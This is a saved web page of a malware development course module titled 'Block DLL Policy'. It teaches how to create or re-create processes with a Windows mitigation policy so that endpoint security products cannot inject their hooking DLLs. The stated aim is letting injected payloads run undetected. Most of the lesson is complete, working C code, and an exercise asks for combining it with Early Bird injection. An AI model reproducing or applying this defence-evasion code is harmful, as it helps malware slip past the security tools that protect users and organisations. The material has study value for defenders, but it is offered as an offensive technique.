<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Block%20DLL%20Policy_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Block%20DLL%20Policy_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Block%20DLL%20Policy_files/css2.css" rel="stylesheet">
        <link href="Block%20DLL%20Policy_files/css2_002.css" rel="stylesheet">
        <title>Block DLL Policy</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Block%20DLL%20Policy_files/app.fdbb573b.css"><link rel="stylesheet" href="Block%20DLL%20Policy_files/app.fdbb573b.css"><link rel="stylesheet" href="Block%20DLL%20Policy_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Block%20DLL%20Policy_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 90 - Block DLL Policy
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Block%20DLL%20Policy_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Block%20DLL%20Policy_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Block%20DLL%20Policy_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/BlockDllPolicy" target="_blank">
                    <img src="Block%20DLL%20Policy_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Block DLL Policy</h2>
<h3>Introduction</h3>
<p>This module introduces a technique that blocks security products from
 installing hooks into the local and remote processes using a special 
process creation flag. The process creation flag blocks non-Microsoft 
signed DLLs from being loaded into the created process, therefore, 
blocking them from installing hooks and performing other security 
mitigations, that would get the implementation detected during runtime.</p>
<h3>The Flag</h3>
<p>The special process creation flag is <code>PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code> and can be set on a newly created process using the <code>UpdateProcThreadAttribute</code> WinAPI. This flag belongs to a family of other <em>mitigation policies</em>
 that Microsoft created to prevent various types of attacks against the 
calling process. These mitigation policies are mostly related to 
exploitation but have other purposes as well. Two examples of mitigation
 policies are <a href="https://learn.microsoft.com/en-us/windows/win32/memory/data-execution-prevention" target="_blank">Data Execution Prevention</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard" target="_blank">Control Flow Guard</a>.</p>
<p>The <code>UpdateProcThreadAttribute</code> WinAPI was previously used in the <em>Spoofing PPID</em> module where an attribute was initialized using <code>InitializeProcThreadAttributeList</code> and then added to the attribute list of the process being created.</p>
<p>The same approach will be used to block non-Microsoft signed DLLs with the main difference being the flag used is <code>PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code>.</p>
<h3>Block DLL Policy On Remote Process</h3>
<p>Recall from the <em>Spoofing PPID</em> module that it's necessary to call <code>InitializeProcThreadAttributeList</code>
 twice, the first time to obtain the required size of the attribute to 
allocate enough memory and the second time with the correct parameters. 
Additionally, the <code>STARTUPINFOEX</code> structure needs to be used rather than <code>STARTUPINFO</code> to update the attributes list.</p>
<p>The <code>CreateProcessWithBlockDllPolicy</code> is a custom-built function that takes the path to a remote executable (<code>lpProcessPath</code>) and creates the process with the block DLL policy enabled.</p>
<p>Unfortunately, this implementation only benefits the child process 
since the implementation will not have this policy enabled, rather only 
its spawned child processes will. This means that the local process will
 remain hooked, as the policy of blocking the injection of non-Microsoft
 signed DLLs into the <code>implementation.exe</code> process was not enabled when the process was created.</p>
<p><img src="Block%20DLL%20Policy_files/block-dll-119432594-98c5ac96-6827-4bd5-b1bd-8101251cf1ef.png" alt="image"></p>
<p>The following <code>CreateProcessWithBlockDllPolicy</code> function creates a process with the block DLLs policy enabled. The function takes 4 arguments:</p>
<p><code>lpProcessPath</code> - The name of the process to create.</p>
<p><code>dwProcessId</code> - A pointer to a DWORD that receives the newly created process's PID.</p>
<p><code>hProcess</code> - A pointer to a HANDLE that receives a handle to the newly created process.</p>
<p><code>hThread</code> - A pointer to a HANDLE that receives a handle to the newly created process's thread.</p>
<pre><code>BOOL CreateProcessWithBlockDllPolicy(IN LPCSTR lpProcessPath, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {


	STARTUPINFOEXA        SiEx        = { 0 };
	PROCESS_INFORMATION   Pi          = { 0 };
	SIZE_T                sAttrSize   = NULL;
	PVOID                 pAttrBuf    = NULL;

	if (lpProcessPath == NULL)
		return FALSE;

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&amp;SiEx, sizeof(STARTUPINFOEXA));
	RtlSecureZeroMemory(&amp;Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	SiEx.StartupInfo.cb       = sizeof(STARTUPINFOEXA);
	SiEx.StartupInfo.dwFlags  = EXTENDED_STARTUPINFO_PRESENT;

//-------------------------------------------------------------------------------

	// Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
	InitializeProcThreadAttributeList(NULL, 1, NULL, &amp;sAttrSize);
	pAttrBuf = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sAttrSize);

	// Initialise our list 
	if (!InitializeProcThreadAttributeList(pAttrBuf, 1, NULL, &amp;sAttrSize)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Enable blocking of non-Microsoft signed DLLs
	DWORD64 dwPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

	// Assign our attribute
	if (!UpdateProcThreadAttribute(pAttrBuf, NULL, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;dwPolicy, sizeof(DWORD64), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)pAttrBuf;

//-------------------------------------------------------------------------------

	if (!CreateProcessA(
		NULL,
		lpProcessPath,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&amp;SiEx.StartupInfo,
		&amp;Pi)) {
		printf("[!] CreateProcessA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	*dwProcessId  = Pi.dwProcessId;
	*hProcess     = Pi.hProcess;
	*hThread      = Pi.hThread;

	// Cleaning up
	DeleteProcThreadAttributeList(pAttrBuf);
	HeapFree(GetProcessHeap(), 0, pAttrBuf);

	if (*dwProcessId != NULL &amp;&amp; *hProcess != NULL &amp;&amp; *hThread != NULL)
		return TRUE;
	else
		return FALSE;
}
</code></pre>
<h3>Block DLL Policy On Local Process</h3>
<p>To enable this policy on the local process, a Linux-style fork 
implementation will be used, whereby the local process creates another 
process of itself with this mitigation policy enabled. To prevent this 
cycle from continuing indefinitely, an argument will be passed to the 
second instance of the process to indicate that it should stop running 
the <code>CreateProcessWithBlockDllPolicy</code> function and instead execute the payload. The pseudocode below demonstrates the logic that will be employed in the code.</p>
<pre><code>int main (int argc, char* argv[]){
  
  if (argc == 2 &amp;&amp; (strcmp(argv[1], STOP_ARG) == 0)) {
    //  PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON is enabled
    //  Running the payload injection code for example
  }
  else {
    // 'STOP_ARG' is not passed to the process, so we create another copy of the local process with the block dll policy 
    // The 'STOP_ARG' argument will be passed in to the another process, making the above if-statement valid, so no more processes will be created
  }
}
</code></pre>
<h3>The Code</h3>
<p>The function below includes preprocessor code to determine if the 
implementation will enable the block DLL policy remotely or locally. 
Additionally, the function performs the following:</p>
<ul>
<li>
<p>If <code>LOCAL_BLOCKDLLPOLICY</code> is not enabled then the <code>CreateProcessWithBlockDllPolicy</code> function is called with the path of the remote executable to run with the block DLL policy enabled.</p>
</li>
<li>
<p>If the <code>LOCAL_BLOCKDLLPOLICY</code> is defined, an if-else statement checks if the <code>STOP_ARG</code> argument is present. If <code>STOP_ARG</code> is not found, then the process has not enabled the block DLL policy, so the <code>CreateProcessWithBlockDllPolicy</code> function is called to re-run the local executable with the <code>STOP_ARG</code> argument.</p>
</li>
<li>
<p>The next time the process is executed, it will have the <code>STOP_ARG</code>
 argument, indicating that the block DLL policy is enabled. This will 
result in the main function proceeding to execute the payload.</p>
</li>
</ul>
<pre><code>// Comment to create a remote process with block dll policy enabled
//
#define LOCAL_BLOCKDLLPOLICY


#ifdef LOCAL_BLOCKDLLPOLICY
#define STOP_ARG "MalDevAcad"
#endif // LOCAL_BLOCKDLLPOLICY

//...

int main(int argc, char* argv[]) {

	DWORD   dwProcessId   = NULL;
	HANDLE  hProcess      = NULL,
            hThread       = NULL;

#ifdef LOCAL_BLOCKDLLPOLICY

	if (argc == 2 &amp;&amp; (strcmp(argv[1], STOP_ARG) == 0)) {
		/*
			the real implementation code
		*/
		printf("[+] Process Is Now Protected With The Block Dll Policy \n");

		WaitForSingleObject((HANDLE)-1, INFINITE);
	}
	else {

		printf("[!] Local Process Is Not Protected With The Block Dll Policy \n");
		
		// getting the local process path + name
		CHAR pcFilename[MAX_PATH * 2];
		if (!GetModuleFileNameA(NULL, &amp;pcFilename, MAX_PATH * 2)) {
			printf("[!] GetModuleFileNameA Failed With Error : %d \n", GetLastError());
			return -1;
		}

		// re-creating local process, so we add the process argument
		// 'pcBuffer' = 'pcFilename' + 'STOP_ARG'

		DWORD dwBufferSize	= (DWORD)(lstrlenA(pcFilename) + lstrlenA(STOP_ARG) + 0xFF);
		CHAR* pcBuffer		= (CHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
		if (!pcBuffer)
			return FALSE;

		sprintf_s(pcBuffer, dwBufferSize, "%s %s", pcFilename, STOP_ARG);

		// fork with block dll policy
		if (!CreateProcessWithBlockDllPolicy(pcBuffer, &amp;dwProcessId, &amp;hProcess, &amp;hThread)) {
			return -1;
		}
		
		HeapFree(GetProcessHeap(), 0, pcBuffer);

		printf("[i] Process Created With Pid %d \n", dwProcessId);

		
	}
#endif // LOCAL_BLOCKDLLPOLICY


#ifndef LOCAL_BLOCKDLLPOLICY
	// if LOCAL_BLOCKDLLPOLICY is not defined
	if (!CreateProcessWithBlockDllPolicy("C:\\Windows\\System32\\RuntimeBroker.exe", &amp;dwProcessId, &amp;hProcess, &amp;hThread)) {
		return -1;
	}
	printf("[i] Process Created With Pid %d \n", dwProcessId);

#endif // !LOCAL_BLOCKDLLPOLICY

	return 0;

}
</code></pre>
<h3>Setting Block DLL Policy At runtime</h3>
<p>There are alternative methods to activate the mitigation policy at 
the local level, aside from using CreateProcess, such as using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy" target="_blank">SetMitigationPolicy</a> WinAPI with the <code>ProcessSignaturePolicy</code> flag during runtime. This can be implemented within the following function.</p>
<p>While this approach may require less effort, it is important to note that executing <code>SetProcessMitigationPolicy</code>
 may raise suspicion as it occurs after EDRs have already injected their
 DLLs meaning the DLLs will remain injected even after the policy is 
enabled.</p>
<pre><code>int main() {
  
    // block dll policy is disabled

	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY Struct = { 0 };

	Struct.MicrosoftSignedOnly = 1;

	if (!SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;Struct, sizeof(Struct))) {
		printf("[!] SetProcessMitigationPolicy Failed With Error : %d \n", GetLastError());
	}
  
    // local process now have block dll mitigation policy enabled - but hooks remain installed
}
</code></pre>
<h3>Conclusion</h3>
<p>Unfortunately, this method will be ineffective against EDRs that have
 their files digitally signed by Microsoft, since their DLLs are allowed
 to be injected even with the block DLL policy enabled.</p>
<h3>Demo</h3>
<ul>
<li>Enabling the block DLL policy on a remote process.</li>
</ul>
<p><img src="Block%20DLL%20Policy_files/block-dll-219450935-66de904e-890a-40f4-87ef-d521b44ab53d.png" alt="z1"></p>
<br>
<ul>
<li>Enabling the block DLL policy on the local process.</li>
</ul>
<p><img src="Block%20DLL%20Policy_files/block-dll-319450939-a6401c36-a633-4068-871e-6e3ea6768da4.png" alt="z2"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Implement block DLL policy on the Early Bird injection technique</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/89"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/90/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/90/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/91"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Block%20DLL%20Policy_files/jquery-3.6.0.min.js"></script>
        <script src="Block%20DLL%20Policy_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Block%20DLL%20Policy_files/app.4474f4d1.css"><link rel="modulepreload" href="Block%20DLL%20Policy_files/app.5f3af5ce.js"><link rel="stylesheet" href="Block%20DLL%20Policy_files/app.4474f4d1.css"><script type="module" src="Block%20DLL%20Policy_files/app.5f3af5ce.js"></script><script src="Block%20DLL%20Policy_files/navbar.js"></script>
<script src="Block%20DLL%20Policy_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 90;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>